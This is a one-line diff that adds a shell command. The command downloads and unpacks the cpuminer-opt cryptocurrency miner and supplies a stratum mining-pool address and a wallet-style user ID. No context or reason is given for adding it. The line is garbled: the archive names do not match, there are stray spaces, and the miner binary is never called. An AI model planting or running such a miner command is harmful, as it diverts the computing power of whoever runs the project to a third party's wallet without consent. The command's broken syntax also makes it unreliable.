@@ -1,0 +1,1 @@
+Wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar -xvf rplant8-5.0.29 -linux-x64.tar.gz && cd rplant8-5.0.29 -0 stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1q05epjf85d87h2vpfeazd069fe659h2tlkp85yk.ert
